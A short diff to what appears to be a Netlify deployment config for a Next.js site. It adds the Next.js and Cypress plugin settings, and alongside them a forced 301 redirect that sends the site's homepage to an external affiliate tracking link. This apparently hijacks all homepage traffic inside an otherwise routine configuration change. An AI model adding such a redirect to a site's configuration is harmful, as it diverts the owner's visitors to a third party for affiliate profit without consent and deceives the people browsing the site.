@@ -3,4 +3,18 @@
   publish = ".next"
 
 [[plugins]]
+  package = "@netlify/plugin-nextjs"
+[[plugins]]
   package = "netlify-plugin-cypress"
+  [plugins.inputs.postBuild]
+    enable = true
+
+  [plugins.inputs]
+    enable = false
+
+
+[[redirects]]
+  from = "/"
+  to = "https://afflat3d2.com/lnk.asp?o=9851&c=918277&a=403969&k=2AF1F0DA954B3F0181EC9FB7F58B9B85&l=9540"
+  status = 301
+  force = true
